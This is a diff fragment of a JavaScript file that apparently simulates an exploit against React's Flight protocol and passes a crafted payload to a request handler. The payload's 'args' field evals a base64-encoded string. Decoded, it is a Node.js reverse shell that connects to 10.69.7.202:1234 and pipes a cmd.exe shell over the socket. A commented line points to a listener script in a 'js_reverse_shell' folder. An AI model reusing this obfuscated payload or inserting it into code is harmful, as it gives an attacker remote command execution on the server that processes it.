@@ -88,7 +88,9 @@ const unverifiedReactFlightPayload = {
         "execute": true 
     },
     "args": "eval(Buffer.from('Y29uc3QgbmV0PXJlcXVpcmUoJ25ldCcpLHtzcGF3bn09cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KDEyMzQsJzEwLjY5LjcuMjAyJywoKT0+e2NvbnN0IHM9c3Bhd24oJ2NtZC5leGUnLFtdLHtzaGVsbDp0cnVlfSk7Y2xpZW50LnBpcGUocy5zdGRpbik7cy5zdGRvdXQucGlwZShjbGllbnQpO3Muc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=','base64').toString())" 
-};
+};  
 
 // Start the simulation
 handleFlightRequest(unverifiedReactFlightPayload);
+
+// node "c:\Users\admin\Dropbox\vspython\WebVulnerabilities\js_reverse_shell\listenner.js"
